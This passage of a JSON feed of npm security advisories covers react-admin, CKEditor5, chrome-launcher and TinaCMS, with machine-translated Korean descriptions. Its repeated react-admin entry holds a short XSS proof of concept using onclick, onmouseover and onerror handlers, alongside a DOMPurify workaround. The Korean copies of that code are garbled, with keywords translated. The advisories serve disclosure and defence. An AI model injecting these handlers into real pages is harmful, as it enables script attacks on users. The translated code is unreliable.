RichTextField;\n```\n\n### References\n\nhttps://github.com/marmelab/react-admin/pull/8644, https://github.com/marmelab/react-admin/pull/8645\n",
    "identifiers": "GHSA : GHSA-5jcr-82fh-339v\nCVE : CVE-2023-25572",
    "severity": "MODERATE",
    "updatedAt": "2023-02-22T22:16:55Z",
    "publishedAt": "2023-02-14T00:32:21Z",
    "references": "https://github.com/marmelab/react-admin/security/advisories/GHSA-5jcr-82fh-339v\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-25572\nhttps://github.com/marmelab/react-admin/pull/8644\nhttps://github.com/marmelab/react-admin/pull/8645\nhttps://github.com/marmelab/react-admin/releases/tag/v3.19.12\nhttps://github.com/marmelab/react-admin/releases/tag/v4.7.6\nhttps://github.com/advisories/GHSA-5jcr-82fh-339v",
    "name": "ra-ui-materialui",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.7.6",
    "identifier": "4.7.6",
    "descriptionKR": "### 영향\n\nreact-admin으로 빌드되고 `<RichTextField>`를 사용하는 모든 React 애플리케이션이 영향을 받습니다.\n\n`<RichTextField>`는 클라이언트 측 삭제 없이 `dangerouslySetInnerHTML`을 사용하여 필드 값을 출력합니다. 데이터가 서버 측에서 삭제되지 않으면 XSS(Cross-Site-Scripting) 공격이 발생할 수 있습니다.\n\n개념의 증거:\n\n```jsx\nimport { RichTextField } from 'react-admin';\n\nconst 레코드 = {\n    아이디: 1,\n    본문: `\n<p>\n<strong>전쟁과 평화</strong>는 러시아 작가의 소설입니다.\n<a href=\"https://en.wikipedia.org/wiki/Leo_Tolstoy\" onclick=\"document.getElementById('stolendata').value='credentials';\">레오 톨스토이</a>,\n연재된 후 1869년에 전체가 출판되었습니다.\n</p>\n<p onmouseover=\"document.getElementById('stolendata').value='credentials';\">\n톨스토이의 가장 훌륭한 문학적 업적 중 하나로 간주되며 세계 문학의 고전으로 남아 있습니다.\n</p>\n<img src=\"x\" onerror=\"document.getElementById('stolendata').value='자격증명';\" />\n`,\n};\n\nconst VulnerableRichTextField = () => (\n    <>\n        <RichTextField 레코드={레코드} 소스=\"본문\" />\n        <시간 />\n        <h4>도난된 데이터:</h4>\n        <input id=\"stolendata\" defaultValue=\"없음\" />\n    </>\n);\n```\n\n### 패치\n\n버전 3.19.12 및 4.7.6은 이제 'DOMPurify'를 사용하여 React 및 'dangerouslySetInnerHTML'로 HTML을 출력하기 전에 HTML을 이스케이프 처리합니다.\n\n### 해결 방법\n\nHTML 데이터 서버 측을 이미 삭제했다면 업그레이드할 필요가 없습니다.\n\n그렇지 않으면 `<RichTextField>`를 수동으로 삭제하는 사용자 정의 필드로 교체해야 합니다.\n\n```tsx\n// 반응 관리자 v4\nimport * as React from 'react';\n'반응'에서 { 메모 } 가져오기;\n'prop-types'에서 PropTypes 가져오기;\n'lodash/get'에서 가져오기 가져오기;\n'@material-ui/core/Typography'에서 타이포그래피 가져오기;\nimport { useRecordContext, sanitizeFieldRestProps, fieldPropTypes } from 'react-admin';\n'dompurify'에서 가져오기 정화;\n\n내보내기 const removeTags = (입력) =>\n    입력? input.replace(/<[^>]+>/gm, '') : '';\n\nconst RichTextField = 메모(\n    소품 => {\n        const { className, emptyText, source, stripTags, ...rest } = 소품;\n        const 레코드 = useRecordContext(props);\n        const 값 = get(레코드, 소스);\n\n        반품 (\n            <타이포그래피\n                클래스이름={클래스이름}\n                변형 = \"body2\"\n                구성요소=\"스팬\"\n                {...sanitizeFieldRestProps(rest)}\n            >\n                {value == null && emptyText ? (\n                    빈 텍스트\n                ) : stripTags ? (\n                    제거태그(값)\n                ) : (\n                    <스팬\n                        dangerlySetInnerHTML={{\n                            __html: purify.sanitize(값),\n                        }}\n                    />\n                )}\n            </타이포그래피>\n        );\n    }\n);\n\nRichTextField.defaultProps = {\n    addLabel: 참,\n    stripTags: 거짓,\n};\n\nRichTextField.propTypes = {\n    // @ts-무시\n    ...Typography.propTypes,\n    ...fieldPropTypes,\n    stripTags: PropTypes.bool,\n};\n\nRichTextField.displayName = '리치텍스트필드';\n\n기본 RichTextField 내보내기;\n```\n\n### 참조\n\nhttps://github.com/marmelab/react-admin/pull/8644, https://github.com/marmelab/react-admin/pull/8645"
  },
  {
    "description": "### Impact\n\nAll React applications built with react-admin and using the `<RichTextField>` are affected. \n\n`<RichTextField>` outputs the field value using `dangerouslySetInnerHTML` without client-side sanitization. If the data isn't sanitized server-side, this opens a possible Cross-Site-Scripting (XSS) attack. \n\nProof of concept:\n\n```jsx\nimport { RichTextField } from 'react-admin';\n\nconst record = {\n    id: 1,\n    body: `\n<p>\n<strong>War and Peace</strong> is a novel by the Russian author\n<a href=\"https://en.wikipedia.org/wiki/Leo_Tolstoy\" onclick=\"document.getElementById('stolendata').value='credentials';\">Leo Tolstoy</a>,\npublished serially, then in its entirety in 1869.\n</p>\n<p onmouseover=\"document.getElementById('stolendata').value='credentials';\">\nIt is regarded as one of Tolstoy's finest literary achievements and remains a classic of world literature.\n</p>\n<img src=\"x\" onerror=\"document.getElementById('stolendata').value='credentials';\" />\n`,\n};\n\nconst VulnerableRichTextField = () => (\n    <>\n        <RichTextField record={record} source=\"body\" />\n        <hr />\n        <h4>Stolen data:</h4>\n        <input id=\"stolendata\" defaultValue=\"none\" />\n    </>\n);\n```\n\n### Patches\n\nVersions 3.19.12 and 4.7.6 now use `DOMPurify` to escape the HTML before outputting it with React and `dangerouslySetInnerHTML`\n\n### Workarounds\n\nYou don't need to upgrade if you already sanitize HTML data server-side. \n\nOtherwise, you'll have to replace the `<RichTextField>` by a custom field doing sanitization by hand:\n\n```tsx\n// react-admin v4\nimport * as React from 'react';\nimport { memo } from 'react';\nimport PropTypes from 'prop-types';\nimport get from 'lodash/get';\nimport Typography from '@material-ui/core/Typography';\nimport { useRecordContext, sanitizeFieldRestProps, fieldPropTypes } from 'react-admin';\nimport purify from 'dompurify';\n\nexport const removeTags = (input) =>\n    input ? input.replace(/<[^>]+>/gm, '') : '';\n\nconst RichTextField = memo(\n    props => {\n        const { className, emptyText, source, stripTags, ...rest } = props;\n        const record = useRecordContext(props);\n        const value = get(record, source);\n\n        return (\n            <Typography\n                className={className}\n                variant=\"body2\"\n                component=\"span\"\n                {...sanitizeFieldRestProps(rest)}\n            >\n                {value == null && emptyText ? (\n                    emptyText\n                ) : stripTags ? (\n                    removeTags(value)\n                ) : (\n                    <span\n                        dangerouslySetInnerHTML={{\n                            __html: purify.sanitize(value),\n                        }}\n                    />\n                )}\n            </Typography>\n        );\n    }\n);\n\nRichTextField.defaultProps = {\n    addLabel: true,\n    stripTags: false,\n};\n\nRichTextField.propTypes = {\n    // @ts-ignore\n    ...Typography.propTypes,\n    ...fieldPropTypes,\n    stripTags: PropTypes.bool,\n};\n\nRichTextField.displayName = 'RichTextField';\n\nexport default RichTextField;\n```\n\n### References\n\nhttps://github.com/marmelab/react-admin/pull/8644, https://github.com/marmelab/react-admin/pull/8645\n",
    "identifiers": "GHSA : GHSA-5jcr-82fh-339v\nCVE : CVE-2023-25572",
    "severity": "MODERATE",
    "updatedAt": "2023-02-22T22:16:55Z",
    "publishedAt": "2023-02-14T00:32:21Z",
    "references": "https://github.com/marmelab/react-admin/security/advisories/GHSA-5jcr-82fh-339v\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-25572\nhttps://github.com/marmelab/react-admin/pull/8644\nhttps://github.com/marmelab/react-admin/pull/8645\nhttps://github.com/marmelab/react-admin/releases/tag/v3.19.12\nhttps://github.com/marmelab/react-admin/releases/tag/v4.7.6\nhttps://github.com/advisories/GHSA-5jcr-82fh-339v",
    "name": "react-admin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.7.6",
    "identifier": "4.7.6",
    "descriptionKR": "### 영향\n\nreact-admin으로 빌드되고 `<RichTextField>`를 사용하는 모든 React 애플리케이션이 영향을 받습니다.\n\n`<RichTextField>`는 클라이언트 측 삭제 없이 `dangerouslySetInnerHTML`을 사용하여 필드 값을 출력합니다. 데이터가 서버 측에서 삭제되지 않으면 XSS(Cross-Site-Scripting) 공격이 발생할 수 있습니다.\n\n개념의 증거:\n\n```jsx\nimport { RichTextField } from 'react-admin';\n\nconst 레코드 = {\n    아이디: 1,\n    본문: `\n<p>\n<strong>전쟁과 평화</strong>는 러시아 작가의 소설입니다.\n<a href=\"https://en.wikipedia.org/wiki/Leo_Tolstoy\" onclick=\"document.getElementById('stolendata').value='credentials';\">레오 톨스토이</a>,\n연재된 후 1869년에 전체가 출판되었습니다.\n</p>\n<p onmouseover=\"document.getElementById('stolendata').value='credentials';\">\n톨스토이의 가장 훌륭한 문학적 업적 중 하나로 간주되며 세계 문학의 고전으로 남아 있습니다.\n</p>\n<img src=\"x\" onerror=\"document.getElementById('stolendata').value='자격증명';\" />\n`,\n};\n\nconst VulnerableRichTextField = () => (\n    <>\n        <RichTextField 레코드={레코드} 소스=\"본문\" />\n        <시간 />\n        <h4>도난된 데이터:</h4>\n        <input id=\"stolendata\" defaultValue=\"없음\" />\n    </>\n);\n```\n\n### 패치\n\n버전 3.19.12 및 4.7.6은 이제 'DOMPurify'를 사용하여 React 및 'dangerouslySetInnerHTML'로 HTML을 출력하기 전에 HTML을 이스케이프 처리합니다.\n\n### 해결 방법\n\nHTML 데이터 서버 측을 이미 삭제했다면 업그레이드할 필요가 없습니다.\n\n그렇지 않으면 `<RichTextField>`를 수동으로 삭제하는 사용자 정의 필드로 교체해야 합니다.\n\n```tsx\n// 반응 관리자 v4\nimport * as React from 'react';\n'반응'에서 { 메모 } 가져오기;\n'prop-types'에서 PropTypes 가져오기;\n'lodash/get'에서 가져오기 가져오기;\n'@material-ui/core/Typography'에서 타이포그래피 가져오기;\nimport { useRecordContext, sanitizeFieldRestProps, fieldPropTypes } from 'react-admin';\n'dompurify'에서 가져오기 정화;\n\n내보내기 const removeTags = (입력) =>\n    입력? input.replace(/<[^>]+>/gm, '') : '';\n\nconst RichTextField = 메모(\n    소품 => {\n        const { className, emptyText, source, stripTags, ...rest } = 소품;\n        const 레코드 = useRecordContext(props);\n        const 값 = get(레코드, 소스);\n\n        반품 (\n            <타이포그래피\n                클래스이름={클래스이름}\n                변형 = \"body2\"\n                구성요소=\"스팬\"\n                {...sanitizeFieldRestProps(rest)}\n            >\n                {value == null && emptyText ? (\n                    빈 텍스트\n                ) : stripTags ? (\n                    제거태그(값)\n                ) : (\n                    <스팬\n                        dangerlySetInnerHTML={{\n                            __html: purify.sanitize(값),\n                        }}\n                    />\n                )}\n            </타이포그래피>\n        );\n    }\n);\n\nRichTextField.defaultProps = {\n    addLabel: 참,\n    stripTags: 거짓,\n};\n\nRichTextField.propTypes = {\n    // @ts-무시\n    ...Typography.propTypes,\n    ...fieldPropTypes,\n    stripTags: PropTypes.bool,\n};\n\nRichTextField.displayName = '리치텍스트필드';\n\n기본 RichTextField 내보내기;\n```\n\n### 참조\n\nhttps://github.com/marmelab/react-admin/pull/8644, https://github.com/marmelab/react-admin/pull/8645"
  },
  {
    "description": "### Impact\n\nAll React applications built with react-admin and using the `<RichTextField>` are affected. \n\n`<RichTextField>` outputs the field value using `dangerouslySetInnerHTML` without client-side sanitization. If the data isn't sanitized server-side, this opens a possible Cross-Site-Scripting (XSS) attack. \n\nProof of concept:\n\n```jsx\nimport { RichTextField } from 'react-admin';\n\nconst record = {\n    id: 1,\n    body: `\n<p>\n<strong>War and Peace</strong> is a novel by the Russian author\n<a href=\"https://en.wikipedia.org/wiki/Leo_Tolstoy\" onclick=\"document.getElementById('stolendata').value='credentials';\">Leo Tolstoy</a>,\npublished serially, then in its entirety in 1869.\n</p>\n<p onmouseover=\"document.getElementById('stolendata').value='credentials';\">\nIt is regarded as one of Tolstoy's finest literary achievements and remains a classic of world literature.\n</p>\n<img src=\"x\" onerror=\"document.getElementById('stolendata').value='credentials';\" />\n`,\n};\n\nconst VulnerableRichTextField = () => (\n    <>\n        <RichTextField record={record} source=\"body\" />\n        <hr />\n        <h4>Stolen data:</h4>\n        <input id=\"stolendata\" defaultValue=\"none\" />\n    </>\n);\n```\n\n### Patches\n\nVersions 3.19.12 and 4.7.6 now use `DOMPurify` to escape the HTML before outputting it with React and `dangerouslySetInnerHTML`\n\n### Workarounds\n\nYou don't need to upgrade if you already sanitize HTML data server-side. \n\nOtherwise, you'll have to replace the `<RichTextField>` by a custom field doing sanitization by hand:\n\n```tsx\n// react-admin v4\nimport * as React from 'react';\nimport { memo } from 'react';\nimport PropTypes from 'prop-types';\nimport get from 'lodash/get';\nimport Typography from '@material-ui/core/Typography';\nimport { useRecordContext, sanitizeFieldRestProps, fieldPropTypes } from 'react-admin';\nimport purify from 'dompurify';\n\nexport const removeTags = (input) =>\n    input ? input.replace(/<[^>]+>/gm, '') : '';\n\nconst RichTextField = memo(\n    props => {\n        const { className, emptyText, source, stripTags, ...rest } = props;\n        const record = useRecordContext(props);\n        const value = get(record, source);\n\n        return (\n            <Typography\n                className={className}\n                variant=\"body2\"\n                component=\"span\"\n                {...sanitizeFieldRestProps(rest)}\n            >\n                {value == null && emptyText ? (\n                    emptyText\n                ) : stripTags ? (\n                    removeTags(value)\n                ) : (\n                    <span\n                        dangerouslySetInnerHTML={{\n                            __html: purify.sanitize(value),\n                        }}\n                    />\n                )}\n            </Typography>\n        );\n    }\n);\n\nRichTextField.defaultProps = {\n    addLabel: true,\n    stripTags: false,\n};\n\nRichTextField.propTypes = {\n    // @ts-ignore\n    ...Typography.propTypes,\n    ...fieldPropTypes,\n    stripTags: PropTypes.bool,\n};\n\nRichTextField.displayName = 'RichTextField';\n\nexport default RichTextField;\n```\n\n### References\n\nhttps://github.com/marmelab/react-admin/pull/8644, https://github.com/marmelab/react-admin/pull/8645\n",
    "identifiers": "GHSA : GHSA-5jcr-82fh-339v\nCVE : CVE-2023-25572",
    "severity": "MODERATE",
    "updatedAt": "2023-02-22T22:16:55Z",
    "publishedAt": "2023-02-14T00:32:21Z",
    "references": "https://github.com/marmelab/react-admin/security/advisories/GHSA-5jcr-82fh-339v\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-25572\nhttps://github.com/marmelab/react-admin/pull/8644\nhttps://github.com/marmelab/react-admin/pull/8645\nhttps://github.com/marmelab/react-admin/releases/tag/v3.19.12\nhttps://github.com/marmelab/react-admin/releases/tag/v4.7.6\nhttps://github.com/advisories/GHSA-5jcr-82fh-339v",
    "name": "react-admin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.19.12",
    "identifier": "3.19.12",
    "descriptionKR": "### 영향\n\nreact-admin으로 빌드되고 `<RichTextField>`를 사용하는 모든 React 애플리케이션이 영향을 받습니다.\n\n`<RichTextField>`는 클라이언트 측 삭제 없이 `dangerouslySetInnerHTML`을 사용하여 필드 값을 출력합니다. 데이터가 서버 측에서 삭제되지 않으면 XSS(Cross-Site-Scripting) 공격이 발생할 수 있습니다.\n\n개념의 증거:\n\n```jsx\nimport { RichTextField } from 'react-admin';\n\nconst 레코드 = {\n    아이디: 1,\n    본문: `\n<p>\n<strong>전쟁과 평화</strong>는 러시아 작가의 소설입니다.\n<a href=\"https://en.wikipedia.org/wiki/Leo_Tolstoy\" onclick=\"document.getElementById('stolendata').value='credentials';\">레오 톨스토이</a>,\n연재된 후 1869년에 전체가 출판되었습니다.\n</p>\n<p onmouseover=\"document.getElementById('stolendata').value='credentials';\">\n톨스토이의 가장 훌륭한 문학적 업적 중 하나로 간주되며 세계 문학의 고전으로 남아 있습니다.\n</p>\n<img src=\"x\" onerror=\"document.getElementById('stolendata').value='자격증명';\" />\n`,\n};\n\nconst VulnerableRichTextField = () => (\n    <>\n        <RichTextField 레코드={레코드} 소스=\"본문\" />\n        <시간 />\n        <h4>도난된 데이터:</h4>\n        <input id=\"stolendata\" defaultValue=\"없음\" />\n    </>\n);\n```\n\n### 패치\n\n버전 3.19.12 및 4.7.6은 이제 'DOMPurify'를 사용하여 React 및 'dangerouslySetInnerHTML'로 HTML을 출력하기 전에 HTML을 이스케이프 처리합니다.\n\n### 해결 방법\n\nHTML 데이터 서버 측을 이미 삭제했다면 업그레이드할 필요가 없습니다.\n\n그렇지 않으면 `<RichTextField>`를 수동으로 삭제하는 사용자 정의 필드로 교체해야 합니다.\n\n```tsx\n// 반응 관리자 v4\nimport * as React from 'react';\n'반응'에서 { 메모 } 가져오기;\n'prop-types'에서 PropTypes 가져오기;\n'lodash/get'에서 가져오기 가져오기;\n'@material-ui/core/Typography'에서 타이포그래피 가져오기;\nimport { useRecordContext, sanitizeFieldRestProps, fieldPropTypes } from 'react-admin';\n'dompurify'에서 가져오기 정화;\n\n내보내기 const removeTags = (입력) =>\n    입력? input.replace(/<[^>]+>/gm, '') : '';\n\nconst RichTextField = 메모(\n    소품 => {\n        const { className, emptyText, source, stripTags, ...rest } = 소품;\n        const 레코드 = useRecordContext(props);\n        const 값 = get(레코드, 소스);\n\n        반품 (\n            <타이포그래피\n                클래스이름={클래스이름}\n                변형 = \"body2\"\n                구성요소=\"스팬\"\n                {...sanitizeFieldRestProps(rest)}\n            >\n                {value == null && emptyText ? (\n                    빈 텍스트\n                ) : stripTags ? (\n                    제거태그(값)\n                ) : (\n                    <스팬\n                        dangerlySetInnerHTML={{\n                            __html: purify.sanitize(값),\n                        }}\n                    />\n                )}\n            </타이포그래피>\n        );\n    }\n);\n\nRichTextField.defaultProps = {\n    addLabel: 참,\n    stripTags: 거짓,\n};\n\nRichTextField.propTypes = {\n    // @ts-무시\n    ...Typography.propTypes,\n    ...fieldPropTypes,\n    stripTags: PropTypes.bool,\n};\n\nRichTextField.displayName = '리치텍스트필드';\n\n기본 RichTextField 내보내기;\n```\n\n### 참조\n\nhttps://github.com/marmelab/react-admin/pull/8644, https://github.com/marmelab/react-admin/pull/8645"
  },
  {
    "description": "CKSource CKEditor5 35.4.0 was discovered to contain a cross-site scripting (XSS) vulnerability via the Full Featured CKEditor5 widget.\n\nNOTE: the vendor's position is that this is not a vulnerability. The CKEditor 5 documentation discusses that it is the responsibility of an integrator (who is adding CKEditor 5 functionality to a website) to choose the correct security settings for their use case. Also, safe default values are established (e.g., config.htmlEmbed.showPreviews is false).",
    "identifiers": "GHSA : GHSA-6p89-3p7c-qrhv\nCVE : CVE-2022-48110",
    "severity": "MODERATE",
    "updatedAt": "2023-02-23T21:52:54Z",
    "publishedAt": "2023-02-13T21:31:04Z",
    "withdrawnAt": "2023-02-15T15:36:00Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-48110\nhttps://ckeditor.com/docs/ckeditor5/latest/features/html-embed.html\nhttps://packetstormsecurity.com/files/170927/CKSource-CKEditor5-35.4.0-Cross-Site-Scripting.html\nhttps://github.com/advisories/GHSA-6p89-3p7c-qrhv",
    "name": "ckeditor5",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 36.0.0",
    "identifier": "36.0.0",
    "descriptionKR": "CKSource CKEditor5 35.4.0은 Full Featured CKEditor5 위젯을 통해 교차 사이트 스크립팅(XSS) 취약점을 포함하는 것으로 발견되었습니다.\n\n참고: 공급업체의 입장은 이것이 취약점이 아니라는 것입니다. CKEditor 5 문서에서는 사용 사례에 맞는 올바른 보안 설정을 선택하는 것이 통합자(웹사이트에 CKEditor 5 기능을 추가하는 사람)의 책임이라고 설명합니다. 또한 안전한 기본값이 설정됩니다(예: config.htmlEmbed.showPreviews는 false임)."
  },
  {
    "description": "All versions of the package create-choo-app3 are vulnerable to Command Injection via the devInstall function due to improper user-input sanitization.",
    "identifiers": "GHSA : GHSA-rj7m-2p3g-fjxg\nCVE : CVE-2022-25855",
    "severity": "HIGH",
    "updatedAt": "2023-02-13T20:51:27Z",
    "publishedAt": "2023-02-06T06:30:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25855\nhttps://security.snyk.io/vuln/SNYK-JS-CREATECHOOAPP3-3157951\nhttps://github.com/advisories/GHSA-rj7m-2p3g-fjxg",
    "name": "create-choo-app3",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.12.3",
    "descriptionKR": "패키지 create-choo-app3의 모든 버전은 부적절한 사용자 입력 삭제로 인해 devInstall 기능을 통한 명령 주입에 취약합니다."
  },
  {
    "description": "A cross site scripting (XSS) vulnerability in the Insert Video function of Froala WYSIWYG Editor allows attackers to execute arbitrary web scripts or HTML.",
    "identifiers": "GHSA : GHSA-97x5-cc53-cv4v\nCVE : CVE-2020-22864",
    "severity": "MODERATE",
    "updatedAt": "2023-02-13T18:05:45Z",
    "publishedAt": "2021-10-28T23:14:06Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-22864\nhttps://github.com/froala/wysiwyg-editor/issues/3880\nhttps://github.com/froala/wysiwyg-editor/pull/3911\nhttps://github.com/418sec/wysiwyg-editor/pull/1\nhttps://www.youtube.com/watch?v=WE3b1iSnWJY\nhttps://github.com/froala/wysiwyg-editor/releases/tag/v4.0.11\nhttps://github.com/advisories/GHSA-97x5-cc53-cv4v",
    "name": "froala-editor",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 4.0.6",
    "identifier": "4.0.11",
    "descriptionKR": "Froala WYSIWYG Editor의 비디오 삽입 기능에 있는 XSS(교차 사이트 스크립팅) 취약점으로 인해 공격자가 임의의 웹 스크립트 또는 HTML을 실행할 수 있습니다."
  },
  {
    "description": "chrome-launcher prior to 0.13.2 is subject to OS Command Injection via the $HOME environment variable in Linux operating systems. This issue is patched in version 0.13.2.",
    "identifiers": "GHSA : GHSA-gp2j-mg4w-2rh5\nCVE : CVE-2020-7645",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-10T19:46:55Z",
    "publishedAt": "2022-05-24T17:17:04Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-7645\nhttp://snyk.io/vuln/SNYK-JS-CHROMELAUNCHER-537575\nhttps://github.com/GoogleChrome/chrome-launcher/pull/197\nhttps://github.com/advisories/GHSA-gp2j-mg4w-2rh5",
    "name": "chrome-launcher",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.13.2",
    "identifier": "0.13.2",
    "descriptionKR": "0.13.2 이전의 chrome-launcher는 Linux 운영 체제에서 $HOME 환경 변수를 통해 OS 명령 주입을 받습니다. 이 문제는 버전 0.13.2에서 패치되었습니다."
  },
  {
    "description": "A vulnerability was found in Segmentio is-url up to 1.2.2. It has been rated as problematic. Affected by this issue is an unknown functionality of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. Upgrading to version 1.2.3 is able to address this issue. The name of the patch is 149550935c63a98c11f27f694a7c4a9479e53794. It is recommended to upgrade the affected component. VDB-220058 is the identifier assigned to this vulnerability.",
    "identifiers": "GHSA : GHSA-p9w8-2mpq-49h9\nCVE : CVE-2018-25079",
    "severity": "HIGH",
    "updatedAt": "2023-02-22T05:07:34Z",
    "publishedAt": "2023-02-04T06:30:15Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-25079\nhttps://github.com/segmentio/is-url/pull/18\nhttps://github.com/segmentio/is-url/commit/149550935c63a98c11f27f694a7c4a9479e53794\nhttps://github.com/segmentio/is-url/releases/tag/v1.2.3\nhttps://vuldb.com/?ctiid.220058\nhttps://vuldb.com/?id.220058\nhttps://github.com/advisories/GHSA-p9w8-2mpq-49h9",
    "name": "is-url",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.2.3",
    "identifier": "1.2.3",
    "descriptionKR": "Segmentio is-url 1.2.2까지 취약점이 발견되었습니다. 문제가 있는 것으로 평가되었습니다. 이 문제의 영향을 받는 것은 index.js 파일의 알 수 없는 기능입니다. 조작은 비효율적인 정규식 복잡성을 초래합니다. 공격은 원격으로 시작할 수 있습니다. 버전 1.2.3으로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치 이름은 149550935c63a98c11f27f694a7c4a9479e53794입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. VDB-220058은 이 취약점에 할당된 식별자입니다."
  },
  {
    "description": "### Impact\n\nUser-provided strings to formula's parser might lead to polynomial execution time.\n\n### Patches\n\nUsers should upgrade to 3.0.1+.\n\n### Workarounds\n\nNone.",
    "identifiers": "GHSA : GHSA-c2jc-4fpr-4vhg\nCVE : CVE-2023-25166",
    "severity": "MODERATE",
    "updatedAt": "2023-02-08T22:38:10Z",
    "publishedAt": "2023-02-08T22:38:10Z",
    "references": "https://github.com/hapijs/formula/security/advisories/GHSA-c2jc-4fpr-4vhg\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-25166\nhttps://github.com/hapijs/formula/commit/9fbc20a02d75ae809c37a610a57802cd1b41b3fe\nhttps://github.com/advisories/GHSA-c2jc-4fpr-4vhg",
    "name": "@sideway/formula",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.0.1",
    "identifier": "3.0.1",
    "descriptionKR": "### 영향\n\n수식의 파서에 대한 사용자 제공 문자열은 다항식 실행 시간으로 이어질 수 있습니다.\n\n### 패치\n\n사용자는 3.0.1+로 업그레이드해야 합니다.\n\n### 해결 방법\n\n없음."
  },
  {
    "description": "Cross Site Scripting vulnerability in Joplin Desktop App before v2.9.17 allows attacker to execute arbitrary code via improper santization.",
    "identifiers": "GHSA : GHSA-h6c2-879r-jffh\nCVE : CVE-2022-45598",
    "severity": "MODERATE",
    "updatedAt": "2023-02-08T21:56:38Z",
    "publishedAt": "2023-01-31T18:30:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-45598\nhttps://github.com/laurent22/joplin/commit/a2de167b95debad83a0f0c7925a88c0198db812e\nhttps://github.com/laurent22/joplin/releases/tag/v2.9.17\nhttps://github.com/advisories/GHSA-h6c2-879r-jffh",
    "name": "joplin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.9.17",
    "identifier": "2.9.17",
    "descriptionKR": "v2.9.17 이전의 Joplin 데스크톱 앱의 교차 사이트 스크립팅 취약성으로 인해 공격자가 부적절한 삭제를 통해 임의 코드를 실행할 수 있습니다."
  },
  {
    "description": "Versions of the package mt7688-wiscan before 0.8.3 are vulnerable to Command Injection due to improper input sanitization in the 'wiscan.scan' function.",
    "identifiers": "GHSA : GHSA-5h8c-8ccp-8gmh\nCVE : CVE-2022-25916",
    "severity": "HIGH",
    "updatedAt": "2023-02-08T21:48:42Z",
    "publishedAt": "2023-02-01T06:30:30Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25916\nhttps://github.com/simenkid/mt7688-wiscan/commit/ff6d6567c65b4e972916a8fbc4533212f20a2fa5\nhttps://github.com/simenkid/mt7688-wiscan/blob/master/index.js%23L22\nhttps://security.snyk.io/vuln/SNYK-JS-MT7688WISCAN-3177394\nhttps://github.com/advisories/GHSA-5h8c-8ccp-8gmh",
    "name": "mt7688-wiscan",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.8.3",
    "identifier": "0.8.3",
    "descriptionKR": "패키지 mt7688-wiscan 0.8.3 이전 버전은 'wiscan.scan' 함수의 부적절한 입력 삭제로 인해 명령 주입에 취약합니다."
  },
  {
    "description": "### Impact\n\nSensitive Information leaked via script File in TinaCMS. Sites building with @tinacms/cli >= 1.0.0 && < 1.0.9 that store sensitive values in process.env var are impacted. If you're on a version prior to 1.0.0 this vulnerability does not affect you.\n\nIf your Tina-enabled website has sensitive credentials stored as environment variables (eg. Algolia API keys) you should rotate those keys immediately.\n\n### Patches\n\nThis issue has been patched in @tinacms/cli@1.0.9\n\n### Workarounds\n\nUpgrading, and rotating secure & exposed keys is required for the proper fix.\n\n### References\n\nhttps://github.com/tinacms/tinacms/pull/3584",
    "identifiers": "GHSA : GHSA-pc2q-jcxq-rjrr\nCVE : CVE-2023-25164",
    "severity": "HIGH",
    "updatedAt": "2023-02-08T22:40:19Z",
    "publishedAt": "2023-02-08T18:18:05Z",
    "references": "https://github.com/tinacms/tinacms/security/advisories/GHSA-pc2q-jcxq-rjrr\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-25164\nhttps://github.com/tinacms/tinacms/pull/3584\nhttps://github.com/advisories/GHSA-pc2q-jcxq-rjrr",
    "name": "@tinacms/cli",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.0.0, < 1.0.9",
    "identifier": "1.0.9",
    "descriptionKR": "### 영향\n\nTinaCMS의 스크립트 파일을 통해 민감한 정보가 유출되었습니다. process.env var에 민감한 값을 저장하는 @tinacms/cli >= 1.0.0 && < 1.0.9로 구축된 사이트가 영향을 받습니다. 1.0.0 이전 버전을 사용 중인 경우 이 취약점이 영향을 미치지 않습니다.\n\nTina 지원 웹사이트에 환경 변수(예: Algolia API 키)로 저장된 민감한 자격 증명이 있는 경우 해당 키를 즉시 교체해야 합니다.\n\n### 패치\n\n이 문제는 @tinacms/cli@1.0.9에서 패치되었습니다.\n\n### 해결 방법\n\n올바른 수정을 위해서는 보안 및 노출 키를 업그레이드하고 교체해야 합니다.\n\n### 참조\n\nhttps://github.com/tinacms/tinacms/pull/3584"
  },
  {
    "description": "All versions of the package semver-tags are vulnerable to Command Injection via the getGitTagsRemote function due to improper input sanitization.",
    "identifiers": "GHSA : GHSA-8h3g-hcwp-6hxq\nCVE : CVE-2022-25853",
    "severity": "HIGH",
    "updatedAt": "2023-02-13T20:51:30Z",
    "publishedAt": "2023-02-06T06:30:25Z",
